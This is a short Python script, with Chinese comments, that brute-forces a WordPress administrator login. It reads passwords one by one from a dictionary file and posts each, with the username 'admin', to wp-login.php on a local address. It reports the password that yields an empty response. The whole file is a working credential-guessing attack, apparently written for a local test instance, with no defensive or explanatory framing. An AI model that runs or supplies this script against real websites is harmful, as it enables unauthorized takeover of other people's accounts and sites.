import urllib.parse
import urllib.request
import sys
#基本设置
name = "admin"
url = "http://127.0.0.1:8052/wp-login.php"
dict_name = "dict.txt"
#主循环
file = open(dict_name)
for i in file.readlines():
    i = i.strip()
    #print(i)
    try:
        data = urllib.parse.urlencode({'log':name,
                                       'pwd':i,
                                       'redirect_to':''})
        data = data.encode('utf-8')
        req = urllib.request.Request(url, data)
        #发送POST请求
        content = urllib.request.urlopen(req)
        text = content.read()
        #print(text)
        if text == b'':
            print("Successful")
            print("Password is : %s" % i)
            sys.exit()
        else:
            print("try %s failed" % i)
    except Exception:
        print("Unexpecct error")